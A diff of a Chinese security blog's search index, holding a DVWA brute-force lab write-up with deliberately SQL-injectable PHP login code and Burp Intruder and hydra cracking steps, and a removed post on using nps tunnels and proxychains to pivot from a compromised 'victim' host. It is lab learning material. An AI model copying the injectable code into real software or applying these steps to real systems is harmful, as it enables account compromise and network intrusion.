class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>针对sql注入起了保护措施，但是sqlmap照样注入了。。。</p>
-<p>但是对于爆破并没什么阻碍，和<a href="#low">low</a>一样就行了</p>
-<img src="dvwa-brute-force/image-20200721103614652.png" alt="image-20200721103614652" style="zoom:50%;" />
-
-
-
-<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>还是可以注入（</p>
-<p>步骤都是一样的，但是这次对于字典有一定的要求了</p>
-<p>之前我那本字典不够用了，所以就没有爆破出来</p>
-<p>使用<code>hydra + rock_you</code>就爆出来了（不过出来了很多）</p>
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>dvwa</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>web</tag>
-        <tag>dvwa</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctf.show 通关记录(1)</title>
     <url>//ctf-show01.html</url>
     <content><![CDATA[<p><a href="https://ctf.show/">ctf.show</a>平台web 1-4</p>
@@ -2956,6 +2987,61 @@
         <tag>CTF</tag>
         <tag>web</tag>
         <tag>ctf-show</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>dvwa-brute-force</title>
+    <url>//brute-force.html</url>
+    <content><![CDATA[<p>dvwa靶场的暴力破解部分</p>
+<p>暴力破解取决于密码本</p>
+<p>好用的密码本事半功倍</p>
+<a id="more"></a>
+
+
+
+<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>甚至可以sql注入。</p>
+<p>在页面抓包之后选择<code>send to Intruder</code></p>
+<img src="dvwa-brute-force/image-20200721101658090.png" alt="image-20200721101658090" style="zoom:50%;" />
+
+<p>然后在<code>position</code>界面password地方增加标记，其他的标记清除</p>
+<img src="dvwa-brute-force/image-20200721102030788.png" alt="image-20200721102030788" style="zoom:50%;" />
+
+<p>前往payload界面，选择<code>payloads</code>，start attack即可</p>
+<img src="dvwa-brute-force/image-20200721102153217.png" alt="image-20200721102153217" style="zoom:50%;" />
+
+<p>发现一个返回长度不一样</p>
+<img src="dvwa-brute-force/image-20200721102255259.png" alt="image-20200721102255259" style="zoom:50%;" />
+
+<p>尝试登陆，成功</p>
+<img src="dvwa-brute-force/image-20200721102315065.png" alt="image-20200721102315065" style="zoom:50%;" />
+
+
+
+<h2 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>针对sql注入起了保护措施，但是sqlmap照样注入了。。。</p>
+<p>但是对于爆破并没什么阻碍，和<a href="#low">low</a>一样就行了</p>
+<img src="dvwa-brute-force/image-20200721103614652.png" alt="image-20200721103614652" style="zoom:50%;" />
+
+
+
+<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>还是可以注入（</p>
+<p>步骤都是一样的，但是这次对于字典有一定的要求了</p>
+<p>之前我那本字典不够用了，所以就没有爆破出来</p>
+<p>使用<code>hydra + rock_you</code>就爆出来了（不过出来了很多）</p>
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>dvwa</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>web</tag>
+        <tag>dvwa</tag>
       </tags>
   </entry>
   <entry>
@@ -3145,97 +3231,38 @@
       </tags>
   </entry>
   <entry>
-    <title>使用nps</title>
-    <url>//nps.html</url>
-    <content><![CDATA[<p>使用<code>nps</code>工具进行内网渗透</p>
-<a id="more"></a>
-
-
-
-<h2 id="nps下载"><a href="#nps下载" class="headerlink" title="nps下载"></a>nps下载</h2><p><a href="https://github.com/ehang-io/nps">github文档</a></p>
-<p><a href="https://github.com/ehang-io/nps/releases">github release</a></p>
-<p>根据自己的环境下载对应的版本，这里使用<code>linux_amd64_client</code>和<code>linux_amd64_server</code>做例子</p>
-<h2 id="server"><a href="#server" class="headerlink" title="server"></a>server</h2><h3 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h3><p>将<code>linux_amd64_server.tar.gz</code>上传至公网机(<code>vps</code>)，</p>
-<p>使用<code>tar -xvf linux_amd64_server.tar.gz</code>解压，解压后文件如下</p>
-<img src="nps/image-20200819150524939.png" alt="image-20200819150524939" style="zoom:50%;" />
-
-<p>运行<code>./nps install</code>命令，安装工具</p>
-<img src="nps/image-20200819151325928.png" alt="image-20200819151325928" style="zoom:50%;" />
-
-<p>需要（至少）开启这几个端口</p>
-<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p><font color=red>一定要改密码</font></p>
-<p>安装完成之后打开配置文件</p>
-<p><code>vim /etc/nps/conf/nps.conf</code></p>
-<img src="nps/image-20200819150819441.png" alt="image-20200819150819441" style="zoom:50%;" />
-
-<p>其中</p>
-<ul>
-<li><code>web_username</code>是web端登录的用户名，在之后会用到</li>
-<li><code>web_password</code>是web端登录的密码</li>
-<li><code>web_port</code>是web服务运行的端口号</li>
-</ul>
-<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>访问<code>ip:web_port</code>进入web端</p>
-<img src="nps/image-20200819151101879.png" alt="image-20200819151101879" style="zoom:50%;" />
-
-<p>输入正确的<code>username</code>和<code>password</code>之后进入界面</p>
-<h3 id="新建客户端"><a href="#新建客户端" class="headerlink" title="新建客户端"></a>新建客户端</h3><p>选择**<code>客户端</code> -&gt; <code>新建</code>**</p>
-<img src="nps/image-20200819151436822.png" alt="image-20200819151436822" style="zoom:50%;" />
-
-<ul>
-<li><code>备注</code>：写给自己看的注释（</li>
-<li><code>认证用户名、密码</code>：攻击机使用这个用户名、密码接入nps服务端，通过隧道和受害机相连</li>
-</ul>
-<h3 id="新建隧道"><a href="#新建隧道" class="headerlink" title="新建隧道"></a>新建隧道</h3><p>新建完客户端之后点击<code>隧道</code></p>
-<img src="nps/image-20200819152251731.png" alt="image-20200819152251731" style="zoom:50%;" />
-
-<p><code>新建</code></p>
-<img src="nps/image-20200819152339494.png" alt="image-20200819152339494" style="zoom:50%;" />
-
-
-
-<h2 id="client"><a href="#client" class="headerlink" title="client"></a>client</h2><p>在新建完客户端之后</p>
-<img src="nps/image-20200819151745081.png" alt="image-20200819151745081" style="zoom:50%;" />
-
-<p>点击**<code>+</code>**</p>
-<img src="nps/image-20200819151827068.png" alt="image-20200819151827068" style="zoom:50%;" />
-
-<p>得到这一串指令</p>
-<p>将<code>linux_amd64_client.tar.gz</code>解压，得到一个<code>npc</code></p>
-<p>将npc上传至受害机</p>
-<p><code>chmod +x npc</code>给予运行权限，然后运行上面服务端给出的指令</p>
-<p>服务端刷新之后可以看到状态变为<code>在线</code></p>
-<img src="nps/image-20200819152123248.png" alt="image-20200819152123248" style="zoom:50%;" />
-
-
-
-<h2 id="攻击机连接"><a href="#攻击机连接" class="headerlink" title="攻击机连接"></a>攻击机连接</h2><p>这里使用<code>kali linux</code>示例</p>
-<p>编辑<code>/etc/proxychain.conf</code>文件，注释掉最后一句</p>
-<img src="nps/image-20200819152536104.png" alt="image-20200819152536104" style="zoom:50%;" />
-
-<p>添加一句<code>socks5 ip port username password</code></p>
-<p>其中，<code>username</code> 和 <code>password</code> 是新建客户端的时候使用的那个</p>
-<p>连接上去之后使用</p>
-<p><code>proxychains</code> + <code>[shell](例如 nmap 172.12.0.3)</code></p>
-<p>这里举例一个</p>
-<p><code>proxychains firefox</code></p>
-<img src="nps/image-20200819155154169.png" alt="image-20200819155154169" style="zoom:50%;" />
-
-<p>可以访问到</p>
-]]></content>
-      <categories>
-        <category>tools</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>tools</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php伪协议</title>
     <url>//php_agreement.html</url>
     <content><![CDATA[<p>（还没有开始写）</p>
 <p>参考资料: <a href="https://segmentfault.com/a/1190000018991087">php伪协议总结</a></p>
 <a id="more"></a>
+
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php中的系统常量</title>
+    <url>//php_systemVar.html</url>
+    <content><![CDATA[<p>php中的常量</p>
+<p>参见<a href="https://www.php.net/manual/zh/reserved.variables.php">php手册</a></p>
+<a id="more"></a>
+
+
+
